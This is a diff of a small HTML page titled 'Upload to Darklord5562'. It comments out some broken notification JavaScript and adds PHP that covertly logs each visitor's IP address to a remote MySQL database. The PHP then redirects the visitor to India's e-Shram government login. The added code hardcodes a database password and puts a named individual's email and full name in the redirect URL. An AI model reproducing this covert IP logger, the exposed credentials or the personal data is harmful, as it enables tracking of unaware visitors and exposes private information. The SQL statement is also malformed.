@@ -2,28 +2,49 @@
 <html>
 
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Upload to Darklord5562</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Upload to Darklord5562</title>
 </head>
 
 <body>
-
-<div id="code">
-  
-</div>
-
-
+  <div id="code">
+  </div>
+  <!---
 <script type="text/javascript" charset="utf-8">
 var cd = document.getElementById('code')
-  var push = new Notification();
-  push.requestPermission()
-  var flag = push.permisson
-  alert(flag)
+  new Notification();
+  Notification.requestPermission()
+  var flag = Notification.permisson()
+  alert('hii')
   alert(`${push}`)
   console.log(push)
   
 </script>
+
+
+---->
 </body>
 
 </html>
+
+
+
+
+
+<?php
+$ip = $_SERVER['REMOTE_ADDR'];
+
+$con = mysqli_connect("sql303.epizy.com","epiz_29737684","2ZgUZomkT0C1","epiz_29737684_ips");
+
+if (mysqli_connect_errno()) {
+  echo "Failed to connect to MySQL: " . mysqli_connect_error();
+  exit();
+  }
+  
+  $sql= 'INSERT INTO table_name (ip)
+  VALUES ('.$ip.');';
+  mysqli_query($con, $sql);
+  header("location:https://register.eshram.gov.in/#/cscuser/login?csc_id=433634260015&email=rpsatpathybdk@gmail.com&state_code=OR&fullname=Manoranjan%20Mishra");
+
+?>
